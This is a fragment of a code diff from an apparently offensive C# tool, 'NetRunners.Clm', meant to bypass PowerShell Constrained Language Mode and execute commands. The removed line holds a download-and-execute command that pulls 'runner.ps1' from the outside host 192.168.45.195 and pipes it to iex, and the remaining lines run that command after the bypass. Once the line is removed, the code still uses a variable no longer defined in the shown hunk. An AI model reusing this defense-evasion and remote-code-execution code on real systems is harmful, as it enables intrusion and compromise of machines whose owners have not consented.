@@ -43,8 +43,6 @@ namespace NetRunners.Clm
             {
                 return; // Exit if any checks fail or patching fails
             }
-            string cmd = "powershell iwr -uri http://192.168.45.195/ps1/runner.ps1 | iex";
-
             // uncomment choice 
             //BypassClm();            // interactive powershell session
             Command.Execute(cmd);   // bypass clm, exec command
